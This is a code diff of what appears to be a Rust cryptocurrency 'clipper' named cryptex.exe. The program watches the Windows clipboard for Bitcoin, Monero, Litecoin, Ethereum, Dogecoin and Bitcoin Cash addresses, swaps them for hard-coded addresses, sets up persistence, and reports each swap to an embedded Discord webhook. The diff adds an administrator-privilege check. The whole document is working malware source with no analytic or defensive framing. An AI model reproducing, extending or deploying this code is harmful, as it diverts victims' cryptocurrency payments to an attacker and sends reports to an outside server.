@@ -1,8 +1,8 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 
 use clipboard::{windows_clipboard::WindowsClipboardContext, ClipboardProvider};
 use regex::Regex;
-use winapi::um::{synchapi::{OpenMutexW, CreateMutexW}, winnt::SYNCHRONIZE};
+use winapi::um::{synchapi::{OpenMutexW, CreateMutexW}, winnt::SYNCHRONIZE, shellapi::ShellExecuteW, winuser::SW_SHOW};
 use std::{
     collections::HashMap,
     env,
@@ -15,6 +15,7 @@ use std::{
     time::Duration, ffi::OsStr, os::windows::{prelude::OsStrExt, raw::HANDLE}, ptr::null_mut,
 };
 use winreg::{enums::*, RegKey};
+use std::io::Error;
 
 static WEBHOOK: &str = "https://discord.com/api/webhooks/1103006398784212992/50iC4B_EO-wOFggTNnSXi4AXzawaObUmK9LzoNfalQbB6_Xw0T0kRTX2hdeXZLzaDRDf";
 static FILE_NAME: &str = "cryptex.exe";
@@ -137,32 +138,69 @@ fn check_mutex() -> bool {
     true
 }
 
+fn is_administrator() -> Result<bool, Error> {
+    use std::mem;
+    use winapi::shared::minwindef::DWORD;
+    use winapi::um::processthreadsapi::OpenProcessToken;
+    use winapi::um::securitybaseapi::GetTokenInformation;
+    use winapi::um::winnt::{HANDLE, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation};
+
+    let token: HANDLE = null_mut();
+    let process_handle = unsafe { winapi::um::processthreadsapi::GetCurrentProcess() };
+    let success = unsafe { OpenProcessToken(process_handle, TOKEN_QUERY, &token as *const _ as *mut _) } != 0;
+
+    if !success {
+        return Err(Error::last_os_error());
+    }
+
+    let mut elevation: TOKEN_ELEVATION = unsafe { mem::zeroed() };
+    let mut ret_len: DWORD = 0;
+
+    let success = unsafe {
+        GetTokenInformation(
+            token,
+            TokenElevation,
+            &mut elevation as *mut _ as *mut _,
+            mem::size_of::<TOKEN_ELEVATION>() as u32,
+            &mut ret_len as *mut _,
+        ) != 0
+    };
+
+    if !success {
+        return Err(Error::last_os_error());
+    }
+
+    Ok(elevation.TokenIsElevated != 0)
+}
+
 #[tokio::main]
 async fn main() {
-    if check_mutex() {
-        let map: HashMap<&str, &str> = HashMap::from_iter([
-            (
-                r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$",
-                BTC_ADDR,
-            ),
-            (r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", XMR_ADDR),
-            (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR),
-            (r"^(0x)[a-fA-F0-9]{40,128}$", ETH_ADDR),
-            (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
-            (r"^(q|1|bitcoincash:)[a-zA-HJ-NP-Z0-9]{41}$", BCH_ADDR),
-        ]);
-    
-        match persistence().await {
-            Ok(..) => loop {
-                let scan_res = scan(&map);
-    
-                if scan_res.is_some() {
-                    send_webhook("Copied to clipboard".to_string()).await;
-                }
-    
-                thread::sleep(Duration::from_millis(500));
-            },
-            Err(..) => {}
-        };
+    if is_administrator().unwrap() {
+        if check_mutex() {
+            let map: HashMap<&str, &str> = HashMap::from_iter([
+                (
+                    r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$",
+                    BTC_ADDR,
+                ),
+                (r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", XMR_ADDR),
+                (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR),
+                (r"^(0x)[a-fA-F0-9]{40,128}$", ETH_ADDR),
+                (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
+                (r"^(q|1|bitcoincash:)[a-zA-HJ-NP-Z0-9]{41}$", BCH_ADDR),
+            ]);
+        
+            match persistence().await {
+                Ok(..) => loop {
+                    let scan_res = scan(&map);
+        
+                    if scan_res.is_some() {
+                        send_webhook("Copied to clipboard".to_string()).await;
+                    }
+        
+                    thread::sleep(Duration::from_millis(500));
+                },
+                Err(..) => {}
+            };
+        }
     }
 }
